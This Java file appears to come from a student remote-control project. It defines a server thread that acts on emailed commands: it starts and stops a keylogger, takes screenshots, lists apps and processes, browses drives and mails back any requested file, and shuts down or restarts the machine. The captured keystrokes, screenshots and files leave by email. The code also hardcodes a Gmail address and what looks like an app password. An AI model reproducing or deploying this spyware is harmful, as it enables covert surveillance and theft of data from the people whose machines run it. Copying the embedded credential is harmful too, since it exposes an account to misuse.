package com.example.project.server;

import com.example.project.features.getfile.GetFile;
import com.example.project.features.keylogger.KeyLog;
import com.example.project.features.list.ListApp;
import com.example.project.features.list.ListPrc;
import com.example.project.features.power.SRS;
import com.example.project.features.screenshot.Screenshot;
import com.example.project.mail.sendMail;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class sendResponse extends Thread{
    final String DEFAULT_MAIL = "projectmangmaytinh2004@gmail.com";
    final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
    int index = 0;
    String key;
    private int[] counts = {0,0,0,0,0,0,0,0,0,0};


    private String getMail(String mail){
        return mail.substring(mail.indexOf('<')+1,mail.indexOf('>'));
    }

    public sendResponse(String key){
        this.key = key;
    }
    KeyLog kl = new KeyLog();
    @Override
    public void run() {
        if (Server.reqList.isEmpty()){
            return;
        }
        while (index<Server.reqList.size()){
            switch ((Server.reqList.get(index)+" ").substring(0,2)){
                //start keylog
                case "0 ": {
                    ListApp la = new ListApp();
                    File appList;
                    counts[0]++;
                    try {
                        appList = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 0 "+counts[0]);
                    sm.send(appList);
                    break;
                }
                case "1 ": {
                    kl.start();
                    counts[1]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 1 "+counts[1]);
                    sm.sendContent("Successful");
                    System.out.println(1);
                    break;
                }
                //end keylog
                case "2 ": {
                    String text = kl.end();
                    counts[2]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 2 "+counts[2]);
                    FileWriter fw;
                    try {
                        fw = new FileWriter("keylog.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    File file = new File("keylog.txt");
                    sm.send(file);
                    System.out.println(2);
                    break;
                }
                //list app
                case "3 ": {
                    ListPrc la = new ListPrc();
                    counts[3]++;
                    File file;
                    try {
                        file = la.run();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 3 "+counts[3]);
                    sm.send(file);
                    System.out.println(3);
                    break;
                }
                //screenshot
                case "4 ": {
                    Screenshot sc = new Screenshot();
                    counts[4]++;
                    File file;
                    file = sc.takeScreenShot();
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 4 "+counts[4]);
                    sm.send(file);
                    System.out.println(4);
                    break;
                }
                //shutdown
                case "5 ": {
                    counts[5]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 5 "+counts[5]);
                    sm.sendContent("Successful");
                    SRS.shutdown();
                    break;
                }
                //restart
                case "6 ": {
                    counts[6]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 6 "+counts[6]);
                    sm.sendContent("Successful");
                    SRS.restart();
                    break;
                }
                //logout
                case "7 ": {
                    counts[7]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 7 "+counts[7]);
                    sm.sendContent("Successful");
                    SRS.logout();
                    break;
                }
                //sleep
                case "8 ": {
                    counts[8]++;
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 8 "+counts[8]);
                    sm.sendContent("Successful");
                    SRS.sleep();
                    break;
                }
                //getfile
                case "9 ": {
                    String text = "Something wrong happened";
                    counts[9]++;
                    GetFile gf = new GetFile();

                    if (Server.reqList.get(index).length()<=2){

                        text = gf.listDrive();

                    }
                    else {
                        String path = Server.reqList.get(index).substring(2);
                        File file = new File(path);
                        if (file.isDirectory()){
                            text = gf.listFile(file.getAbsolutePath());
                        }
                        else {
                            if (file.exists()){
                                sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
                                sm.send(file);
                                break;
                            }
                            else{
                                text = "File do not exist";
                            }
                        }
                    }
                    File file = new File("filelists.txt");
                    FileWriter fw;
                    try {
                        fw = new FileWriter("filelists.txt");
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.write(text);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        fw.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+counts[9]);
                    sm.send(file);
                    break;
                }
                default: {
                    sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 404");
                    sm.sendContent("Wrong Request");
                    System.out.println(5);
                    break;
                }
            }
            index++;
        }

    }
}
